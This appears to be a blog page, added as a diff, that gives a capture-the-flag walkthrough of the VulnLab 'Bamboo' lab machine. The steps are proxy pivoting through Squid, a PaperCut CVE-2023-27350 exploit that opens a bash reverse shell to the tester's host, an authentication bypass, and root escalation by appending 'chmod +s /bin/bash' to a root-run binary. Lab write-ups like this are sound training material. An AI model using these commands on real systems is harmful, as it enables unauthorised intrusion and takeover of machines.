@@ -1,0 +1,237 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VulnLab, Bamboo Writeup · Remo</title>
+<meta name="description" content="Walkthrough of the Bamboo machine from VulnLab: Squid proxy pivoting, PaperCut CVE-2023-27350 RCE, and a SUID bash privilege escalation to root.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Shippori+Mincho+B1:wght@500;600;700&family=Zen+Kaku+Gothic+New:wght@400;500;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/css/sando.css">
+</head>
+<body>
+<div class="sky"></div><div class="fog"></div><div class="grain"></div>
+<div class="progress"></div>
+
+<!-- NAV -->
+<header class="nav">
+  <div class="nav__inner">
+    <a class="brand" href="index.html" aria-label="Remo, home">
+      <span class="brand__seal"><svg viewBox="0 0 24 24" fill="none" stroke="var(--ember)" stroke-width="1.6" stroke-linecap="round"><path d="M3 8h18M5 8v11M19 8v11M2 8l10-5 10 5M8 8v11M16 8v11"/></svg></span>
+      <span class="brand__name">Remo<small>参道 · SANDŌ</small></span>
+    </a>
+    <nav class="nav__links" aria-label="Primary">
+      <a href="index.html#writeups">Writeups</a><a href="index.html#districts">Categories</a>
+      <a href="index.html#series">Exploit&nbsp;Dev</a><a href="#">Archive</a><a href="index.html#about">About</a>
+    </nav>
+    <div class="nav__tools">
+      <button class="icon-btn search-btn" data-cmdk-open aria-label="Search">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="m21 21-4.3-4.3"/></svg>
+        <span>Search</span><kbd>⌘K</kbd></button>
+      <button class="icon-btn" data-theme-toggle aria-label="Toggle daylight">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 3v2M12 19v2M5 12H3M21 12h-2M6 6 4.5 4.5M19.5 19.5 18 18M18 6l1.5-1.5M4.5 19.5 6 18"/><circle cx="12" cy="12" r="4"/></svg></button>
+      <button class="icon-btn nav__burger" aria-label="Menu"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
+    </div>
+  </div>
+</header>
+
+<!-- ARTICLE HERO -->
+<article>
+<header class="article-hero">
+  <div class="article-hero__bg"><img src="../images/bamboo-banner.png" alt=""></div>
+  <div class="wrap article-hero__inner">
+    <div class="tag-row">
+      <a class="tag tag--ember">Linux Machine</a>
+      <span class="tag tag--sm">VulnLab</span>
+    </div>
+    <h1>Bamboo</h1>
+    <div class="article-meta">
+      <span class="author-chip"><img src="../naruto.jpg" alt="">Remo</span>
+      <span class="dot"></span><span>Mar 30, 2025</span>
+      <span class="dot"></span><span>8 min read</span>
+      <span class="dot"></span><span>squid · cve · web</span>
+    </div>
+  </div>
+</header>
+
+<div class="wrap-wide article-body">
+
+  <!-- TOC RAIL -->
+  <aside class="toc-rail" aria-label="On this page">
+    <h5>参道 · The path</h5>
+    <a href="#recon">Reconnaissance</a>
+    <a href="#pivot">Squid proxy pivot</a>
+    <a href="#rce">PaperCut RCE</a>
+    <a href="#stabilize">Shell stabilization</a>
+    <a href="#bypass">Auth bypass</a>
+    <a href="#root">Privilege escalation</a>
+  </aside>
+
+  <div class="prose">
+    <p class="lead">Hello friends, Remo is back. In this writeup I walk through how I pwned the
+      <strong>Bamboo</strong> machine from <strong>VulnLab</strong>: from initial enumeration to root, covering
+      the key steps, tools, and techniques used to complete the box.</p>
+
+    <figure class="plate"><img src="../images/bamboo-banner.png" alt="Bamboo banner">
+      <figcaption>VulnLab · Bamboo, Linux · web exploitation</figcaption></figure>
+
+    <h2 id="recon">Reconnaissance</h2>
+    <p>Let's start by scanning the machine to see what's exposed.</p>
+    <div class="code-card">
+      <div class="code-card__bar"><span class="code-card__dots"><i></i><i></i><i></i></span>
+        <span class="code-card__lang">bash</span>
+        <button class="code-card__copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg><span>copy</span></button></div>
+      <pre><span class="t-cmd">sudo nmap</span> <span class="t-flag">-sC -sV -sS -O -A</span> <span class="t-flag">-oN</span> scanned.txt <span class="t-flag">-p</span> 22,3128 <span class="t-flag">--min-rate</span>=1000 10.10.110.40</pre>
+    </div>
+    <figure class="plate"><img src="../images/bamboo.png" alt="nmap results" loading="lazy"></figure>
+    <blockquote><p>Notice that we have the <strong>Squid</strong> port (3128) open, which means we can scan the internal ports through it.</p></blockquote>
+
+    <h2 id="pivot">Squid proxy pivot</h2>
+    <p>Now let's scan the internal ports behind the proxy.</p>
+    <div class="code-card">
+      <div class="code-card__bar"><span class="code-card__dots"><i></i><i></i><i></i></span><span class="code-card__lang">bash</span>
+        <button class="code-card__copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg><span>copy</span></button></div>
+      <pre><span class="t-cmd">./squidscan</span></pre>
+    </div>
+    <figure class="plate"><img src="../images/bamboo%201.png" alt="squid scan" loading="lazy"></figure>
+    <p>Now let's add the proxy to our proxychains configuration and curl the newly discovered port.</p>
+    <div class="code-card">
+      <div class="code-card__bar"><span class="code-card__dots"><i></i><i></i><i></i></span><span class="code-card__lang">proxychains.conf</span>
+        <button class="code-card__copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg><span>copy</span></button></div>
+      <pre>http 10.10.110.40 3128</pre>
+    </div>
+    <div class="code-card">
+      <div class="code-card__bar"><span class="code-card__dots"><i></i><i></i><i></i></span><span class="code-card__lang">bash</span>
+        <button class="code-card__copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg><span>copy</span></button></div>
+      <pre><span class="t-cmd">curl</span> <span class="t-flag">--proxy</span> <span class="t-str">http://10.10.110.40:3128</span> <span class="t-str">http://10.10.110.40:9191</span> <span class="t-flag">-v</span></pre>
+    </div>
+    <figure class="plate"><img src="../images/bamboo%203.png" alt="curl through proxy" loading="lazy"></figure>
+
+    <h2 id="rce">PaperCut RCE</h2>
+    <p>A quick search points to a known PaperCut vulnerability. Let's gain RCE, first open a listener, then fire the exploit.</p>
+    <div class="code-card">
+      <div class="code-card__bar"><span class="code-card__dots"><i></i><i></i><i></i></span><span class="code-card__lang">bash</span>
+        <button class="code-card__copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg><span>copy</span></button></div>
+      <pre><span class="t-cmd">nc</span> <span class="t-flag">-lvnp</span> 1337
+<span class="t-cmt"># then, through the proxy:</span>
+<span class="t-cmd">proxychains</span> <span class="t-flag">-q</span> python3 CVE-2023-27350.py <span class="t-flag">-u</span> <span class="t-str">"http://10.10.110.40:9191"</span> <span class="t-flag">-c</span> <span class="t-str">"bash -i >&amp; /dev/tcp/10.8.5.233/1337 0>&amp;1"</span></pre>
+    </div>
+    <figure class="plate"><img src="../images/bamboo%207.png" alt="reverse shell caught" loading="lazy">
+      <figcaption>The listener catches the callback, we have a shell.</figcaption></figure>
+
+    <h2 id="stabilize">Shell stabilization</h2>
+    <p>A raw reverse shell is fragile. Let's upgrade it to a fully interactive TTY.</p>
+    <div class="code-card">
+      <div class="code-card__bar"><span class="code-card__dots"><i></i><i></i><i></i></span><span class="code-card__lang">bash</span>
+        <button class="code-card__copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg><span>copy</span></button></div>
+      <pre>python3 <span class="t-flag">-c</span> <span class="t-str">'import pty;pty.spawn("/bin/bash")'</span>
+<span class="t-cmt"># CTRL+Z, then:</span>
+stty raw <span class="t-flag">-echo</span>;fg
+<span class="t-cmd">export</span> TERM=xterm</pre>
+    </div>
+    <p>Then forward the internal admin port so we can reach it locally.</p>
+    <div class="code-card">
+      <div class="code-card__bar"><span class="code-card__dots"><i></i><i></i><i></i></span><span class="code-card__lang">bash</span>
+        <button class="code-card__copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg><span>copy</span></button></div>
+      <pre><span class="t-cmd">ssh</span> <span class="t-flag">-L</span> 9191:127.0.0.1:9191 papercut@10.10.110.40</pre>
+    </div>
+
+    <h2 id="bypass">Authentication bypass</h2>
+    <p>With the admin console reachable, we abuse a known authentication-bypass to reach the print-management server settings.</p>
+    <div class="code-card">
+      <div class="code-card__bar"><span class="code-card__dots"><i></i><i></i><i></i></span><span class="code-card__lang">bash</span>
+        <button class="code-card__copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg><span>copy</span></button></div>
+      <pre>python3 bypass.py</pre>
+    </div>
+    <figure class="plate"><img src="../images/bamboo%2016.png" alt="auth bypassed" loading="lazy"><figcaption>Bypass confirmed, we're in.</figcaption></figure>
+
+    <h2 id="root">Privilege escalation to root</h2>
+    <p>Monitoring processes with <code>pspy64</code> reveals a <code>server-command</code> binary being executed by a
+      privileged job. We overwrite it to set the SUID bit on bash.</p>
+
+    <table>
+      <thead><tr><th>Step</th><th>Action</th><th>Result</th></tr></thead>
+      <tbody>
+        <tr><td>1</td><td>Run <code>pspy64</code></td><td>Spot <code>server-command</code> executed as root</td></tr>
+        <tr><td>2</td><td>Append payload to the binary</td><td>Queues <code>chmod +s /bin/bash</code></td></tr>
+        <tr><td>3</td><td>Trigger via "refresh servers"</td><td><code>/bin/bash</code> becomes SUID</td></tr>
+        <tr><td>4</td><td><code>/bin/bash -p</code></td><td>Root shell 🎉</td></tr>
+      </tbody>
+    </table>
+
+    <div class="code-card">
+      <div class="code-card__bar"><span class="code-card__dots"><i></i><i></i><i></i></span><span class="code-card__lang">bash</span>
+        <button class="code-card__copy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg><span>copy</span></button></div>
+      <pre><span class="t-cmd">echo</span> <span class="t-str">"chmod +s /bin/bash"</span> &gt;&gt; /home/papercut/server/bin/linux-x64/server-command
+<span class="t-cmt"># then in the web UI, click "refresh servers", and:</span>
+<span class="t-cmd">ls</span> <span class="t-flag">-als</span> /bin/bash
+<span class="t-cmd">/bin/bash</span> <span class="t-flag">-p</span></pre>
+    </div>
+    <figure class="plate"><img src="../images/bamboo%2022.png" alt="root flag" loading="lazy">
+      <figcaption>Root secured, and the flag with it.</figcaption></figure>
+
+    <p>That's it for the <strong>Bamboo</strong> machine, a great test of enumeration and exploitation skills,
+      chaining a Squid pivot, a PaperCut CVE, and a SUID misconfiguration. Hope you found the writeup useful.</p>
+    <p style="font-family:var(--serif);font-size:1.3rem;color:var(--accent)">- Remo</p>
+
+    <!-- AUTHOR -->
+    <div class="author-card">
+      <img src="../naruto.jpg" alt="Remo">
+      <div>
+        <h4>SadlyRemo</h4>
+        <p>Penetration tester focused on Active Directory, web, code review, and mobile. Ex-HackTheBox Top 5 in Egypt. Writing the breaks down, one path at a time.</p>
+        <div class="certs">CRTE · CRTP · CRTO · eWPTX · eCPPT · eMAPT</div>
+      </div>
+    </div>
+
+    <!-- PREV / NEXT -->
+    <nav class="prevnext" aria-label="More writeups">
+      <a href="article.html"><span>← Previous</span><b>VulnLab, Data</b></a>
+      <a class="next" href="article.html"><span>Next →</span><b>VulnLab, Breach</b></a>
+    </nav>
+  </div>
+</div>
+</article>
+
+<!-- FOOTER -->
+<footer class="foot">
+  <div class="vkanji foot__vk">また会おう</div>
+  <div class="wrap-wide">
+    <div class="foot__inner">
+      <div class="foot__brand">
+        <a class="brand" href="index.html"><span class="brand__seal"><svg viewBox="0 0 24 24" fill="none" stroke="var(--ember)" stroke-width="1.6" stroke-linecap="round"><path d="M3 8h18M5 8v11M19 8v11M2 8l10-5 10 5M8 8v11M16 8v11"/></svg></span><span class="brand__name">Remo<small>参道 · SANDŌ</small></span></a>
+        <p>Offensive-security field notes. Always hacking, always learning. 火を絶やすな, keep the lantern lit.</p>
+      </div>
+      <div class="foot__col"><h4>Explore</h4><a href="index.html#writeups">Writeups</a><a href="index.html#districts">Categories</a><a href="index.html#series">Exploit Dev</a><a href="#">Archive</a></div>
+      <div class="foot__col"><h4>Elsewhere</h4><a href="https://github.com/Remo1x">GitHub</a><a href="https://x.com/Rem01x">Twitter / X</a><a href="https://www.linkedin.com/in/rem01x/">LinkedIn</a><a href="https://app.hackthebox.com/profile/1080501">HackTheBox</a></div>
+    </div>
+    <div class="foot__bottom"><span>© <span data-year>2026</span> SadlyRemo · Built on the approach.</span><span>参道 · designed &amp; handcrafted</span></div>
+  </div>
+</footer>
+
+<div class="drawer"><div class="drawer__inner">
+  <a href="index.html#writeups">Writeups<small>最新</small></a><a href="index.html#districts">Categories<small>区</small></a>
+  <a href="index.html#series">Exploit Dev<small>連載</small></a><a href="#">Archive<small>記録</small></a><a href="index.html#about">About<small>私</small></a>
+</div></div>
+
+<div class="cmdk" role="dialog" aria-modal="true" aria-label="Search">
+  <div class="cmdk__panel">
+    <div class="cmdk__input"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="m21 21-4.3-4.3"/></svg>
+      <input type="text" placeholder="Search writeups, tags, techniques…" aria-label="Search"></div>
+    <div class="cmdk__results"></div>
+  </div>
+</div>
+
+<script>
+window.SANDO_INDEX = [
+  {title:"SEH Exploit Development, From Crash to Shell",cat:"ExpDev",tags:"seh windbg",url:"article.html"},
+  {title:"VulnLab, Bamboo",cat:"Linux",tags:"squid proxy cve",url:"article.html"},
+  {title:"VulnLab, Breach",cat:"Windows",tags:"active directory silver ticket",url:"article.html"},
+  {title:"VulnLab, Sendai",cat:"Windows",tags:"adcs esc4 gmsa",url:"article.html"},
+  {title:"HackTheBox, Neonify",cat:"Web",tags:"ruby ssti",url:"article.html"}
+];
+</script>
+<script src="assets/js/sando.js"></script>
+</body>
+</html>
